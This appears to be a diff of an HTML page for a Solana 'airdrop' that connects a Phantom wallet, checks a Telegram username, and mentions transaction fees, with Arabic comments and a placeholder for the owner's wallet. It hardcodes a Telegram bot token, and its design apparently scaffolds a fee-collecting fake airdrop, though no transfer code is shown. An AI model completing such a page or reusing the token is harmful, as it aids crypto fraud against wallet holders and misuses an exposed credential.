@@ -3,67 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>G_M_A_KISS Airdrop</title>
+    <title>GIVE ME A KISS</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    
     <style>
-        body { margin: 0; background: #fbc2eb; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .card { background: rgba(255, 255, 255, 0.9); width: 380px; border-radius: 40px; overflow: hidden; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        
-        /* هنا البرمجة اللي طلبتها: يسحب الصورة من مجلد assets */
-        .header-image { 
-            width: 100%; 
-            height: 260px; 
-            background: url('assets/unnamed (44).jpg') no-repeat center center; 
-            background-size: cover; 
+        body {
+            margin: 0;
+            padding: 0;
+            background: #fbc2eb; /* لون وردي خلفي */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
         }
 
-        .content { padding: 20px; }
-        .input-field { width: 100%; padding: 12px; margin: 8px 0; border-radius: 25px; border: 2px solid #00d2ff; box-sizing: border-box; outline: none; text-align: center; }
-        .connect-btn { width: 100%; background: linear-gradient(90deg, #00c6ff, #00e676); color: white; border: none; border-radius: 25px; padding: 15px; font-weight: bold; cursor: pointer; display: flex; justify-content: space-between; margin: 10px 0; }
-        .send-btn { width: 100%; background: #f04a8a; color: white; border: none; border-radius: 25px; padding: 15px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .status { font-size: 12px; margin-top: 10px; color: #555; }
+        /* حاوية الموقع الرئيسية - حجمها مطابق للصورة */
+        .main-container {
+            position: relative;
+            width: 380px;
+            height: 600px;
+            background: url('assets/unnamed (44).jpg') no-repeat center top;
+            background-size: contain;
+            border-radius: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+
+        /* ترتيب العناصر فوق الصورة بدقة */
+        .overlay-content {
+            position: absolute;
+            top: 250px; /* يبدأ من منطقة الخانات في الصورة */
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* خانة اليوزر */
+        .input-tg {
+            width: 260px;
+            height: 35px;
+            border-radius: 20px;
+            border: 2px solid #00d2ff;
+            text-align: center;
+            outline: none;
+            font-weight: bold;
+        }
+
+        /* خانة المحفظة مع زر التحقق */
+        .wallet-box {
+            position: relative;
+            width: 260px;
+        }
+
+        .input-wallet {
+            width: 100%;
+            height: 35px;
+            border-radius: 20px;
+            border: 1px solid #ddd;
+            padding-right: 10px;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+
+        .btn-verify {
+            position: absolute;
+            left: 5px;
+            top: 5px;
+            background: #e91e63;
+            color: white;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-size: 10px;
+            cursor: pointer;
+        }
+
+        /* زر الربط (Connect Wallet) - شفاف ليظهر فوق الزر اللي بالصورة */
+        .btn-connect {
+            width: 260px;
+            height: 45px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        /* زر الإرسال (Confirm & Send) - شفاف ليظهر فوق الزر الوردي بالصورة */
+        .btn-send {
+            width: 260px;
+            height: 50px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .status-text {
+            color: #777;
+            font-size: 9px;
+            margin-top: 5px;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="header-image"></div> <div class="content">
-        <input type="text" id="tgUser" class="input-field" placeholder="👤 Telegram Username (@)">
-        <input type="text" id="walletAddr" class="input-field" placeholder="💳 Wallet Address" readonly>
-        
-        <button class="connect-btn" id="connectBtn">
-            <span>Connect Wallet</span>
-            <span>PHANTOM</span>
-        </button>
+<div class="main-container">
+    <div class="overlay-content">
+        <input type="text" id="tgUser" class="input-tg" placeholder="Telegram Username">
 
-        <button class="send-btn" id="claimBtn">Confirm & Send</button>
-        <div id="msg" class="status">Fees: 0.0006 SOL</div>
+        <div class="wallet-box">
+            <input type="text" id="walletAddr" class="input-wallet" placeholder="walletAddress" readonly>
+            <button class="btn-verify" id="checkBtn">تحقق</button>
+        </div>
+
+        <button class="btn-connect" id="connectBtn"></button>
+        <button class="btn-send" id="claimBtn"></button>
+
+        <div class="status-text">Fees apply for your transaction.</div>
     </div>
 </div>
 
 <script>
-    // بياناتك الخاصة يا رياض
+    // ضع بياناتك هنا يا رياض
     const BOT_TOKEN = "8313058030:AAEFwZuodTCXPptYxVjEcg2-G6sjUQ1pRIM";
     const CHANNEL_ID = "@G_M_A_KISS_1";
-    const MY_WALLET = "ضع_محفظتك_هنا_يا_رياض"; 
+    const MY_WALLET = "عنوان_محفظتك_هنا";
 
-    // 1. ربط المحفظة
+    // كود الربط
     document.getElementById('connectBtn').onclick = async () => {
-        if (window.solana && window.solana.isPhantom) {
-            try {
-                const resp = await window.solana.connect();
-                document.getElementById('walletAddr').value = resp.publicKey.toString().slice(0,10) + "... (Connected)";
-            } catch (err) { console.log("User rejected"); }
-        } else { alert("Please install Phantom Wallet"); }
+        if (window.solana) {
+            const resp = await window.solana.connect();
+            document.getElementById('walletAddr').value = resp.publicKey.toString();
+        } else { alert("Install Phantom Wallet"); }
     };
 
-    // 2. إرسال العملية (الـ Claim)
-    document.getElementById('claimBtn').onclick = async () => {
-        if (!window.solana.publicKey) { alert("Connect wallet first!"); return; }
-        // هنا يوضع كود التحويل الحقيقي الذي برمجناه سابقاً
-        alert("Transaction Initiated...");
+    // كود التحقق من التليجرام
+    document.getElementById('checkBtn').onclick = async () => {
+        const user = document.getElementById('tgUser').value;
+        if(!user.startsWith('@')) { alert("ابدأ بـ @"); return; }
+        alert("جاري فحص الاشتراك في " + CHANNEL_ID);
+        // ... تكملة كود التحقق
     };
 </script>
+
 </body>
 </html>
